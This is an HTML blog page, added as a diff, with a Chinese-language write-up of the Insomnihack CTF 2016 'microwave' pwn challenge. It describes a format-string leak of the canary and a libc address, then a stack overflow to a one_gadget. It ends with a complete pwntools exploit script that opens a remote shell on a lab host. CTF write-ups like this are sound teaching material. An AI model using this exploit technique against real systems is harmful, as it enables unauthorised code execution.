@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>insomnihack CTF 2016 pwn microwave | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.查看保护机制以及搭建环境：
+
+
+2.ubuntu运行ida64远程调试文件，ida64打开程序分析：
+
+
+
+该程序由三个选项，3是没用的，只有1和2选项有用。
+(1).漏洞函数2 的sub_560712E77F00函数，有格式化字符串漏..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">insomnihack CTF 2016 pwn microwave</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.查看保护机制以及搭建环境：<br>
+<img src="https://closefrom.github.io/post-images/1615579429229.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579440488.png" alt="" loading="lazy"></p>
+<p>2.ubuntu运行ida<em>64远程调试文件，ida</em>64打开程序分析：<br>
+<img src="https://closefrom.github.io/post-images/1615579451432.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579460703.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579468924.png" alt="" loading="lazy"><br>
+该程序由三个选项，3是没用的，只有1和2选项有用。<br>
+(1).漏洞函数2 的sub_560712E77F00函数，有格式化字符串漏洞，但由于开了FORTIFY不能改写地址，并且输入的password（main函数的v3+40处）必须为n07_7h3_fl46，否则 a1+60 （v3+60）处就为0，无法触发第一个漏洞函数。<br>
+(2).漏洞函数1的sub_560712E78000函数，有栈溢出漏洞。可以覆盖返回地址。<br>
+<img src="https://closefrom.github.io/post-images/1615579507528.png" alt="" loading="lazy"></p>
+<p>3.漏洞利用：<br>
+<img src="https://closefrom.github.io/post-images/1615579518179.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579526192.png" alt="" loading="lazy"><br>
+通过漏洞函数2的格式化字符串漏洞，打印出堆栈中的数据，通过在栈中查找可以发现泄漏出来有canary值和libc加载到程序中的函数地址，这样就可以通过 提供的libc文件，查找对应函数的地址以及one_gadget地址，然后计算出偏移，进行getshell。<br>
+<img src="https://closefrom.github.io/post-images/1615579538495.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579547830.png" alt="" loading="lazy"></p>
+<p>编写exp：</p>
+<pre><code>
+from pwn import *
+0x7f41b4d7b708
+context.binary = './microwave'
+#libc_6_stdout_add = 0x3c26e8
+#libc_6_one_gadget_add = 0x45526
+#上面两个地址是题目给的libc6
+#然而在搭建环境的ubuntu中，ldd 查看程序中是用系统中的libc6，所以地址为以下
+libc_6_stdout_add = 0x3c5708
+libc_6_one_gadget_add = 0x45216
+password = 'n07_7h3_fl46'
+
+link = remote("192.168.93.137","6666")
+link.recvuntil("[MicroWave]: ")
+link.sendline('1')
+link.recvuntil("username: ")
+link.sendline("%p."* 7)
+link.recvuntil("password: ")
+link.sendline(password)
+recv1 = link.recvuntil("Twitter account")
+arr = recv1.split()[1].split('.')
+canary =  int(arr[5],16)
+stdout_add = int(arr[6],16)
+py_add = stdout_add - libc_6_stdout_add
+one_gadget_add = py_add + libc_6_one_gadget_add
+link.recvuntil("[MicroWave]: ")
+link.sendline('2')
+link.recv("#> ")
+payload = 'A' * 0x408  #padding
+payload += p64(canary) #canary
+payload += 'A' * 0x8   #rbp
+payload += p64(one_gadget_add) #rip
+link.send(payload)
+link.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615579573372.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/backdoor-ctf-2017-pwn-funsignals/">
+                  <h3 class="post-title">
+                    Backdoor CTF 2017 pwn funsignals
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
